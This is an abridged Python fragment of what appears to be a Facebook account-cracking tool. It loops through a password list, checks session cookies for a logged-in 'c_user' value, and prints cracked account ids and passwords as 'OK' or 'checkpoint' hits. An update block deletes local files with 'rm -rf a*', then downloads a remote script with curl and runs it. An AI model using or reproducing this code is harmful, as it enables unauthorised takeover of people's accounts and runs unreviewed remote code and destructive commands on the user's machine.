...
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/SY3D-WAJID/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/SY3D-WAJID/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/SY3D-WAJID/wajid/main/wajid.py > wajid.py')
        os.system('python wajid.py')
    else:pass
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[WAJID-OK] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[WAJID-CP] '+cid+' | '+ps+'\033[0;97m')
